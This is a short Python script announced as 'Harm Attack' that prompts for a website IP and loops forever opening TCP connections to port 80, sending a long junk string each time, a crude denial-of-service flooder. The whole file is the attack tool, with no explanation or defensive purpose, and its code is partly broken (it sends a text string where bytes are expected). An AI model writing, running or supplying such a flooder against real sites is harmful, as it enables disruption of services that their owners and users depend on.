import socket
print("Welcome In Harm Attack")
ip = input("Enter ip Website : ")
while True :
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    socket.setdefaulttimeout(1)
    conn = sock.connect((ip,80))
    data = "weurytlfjcbslvnkhriogtyojqfbewjfb"*1000
    sock.send(data)
    print('Harm Attack for ip',ip,'port 80')
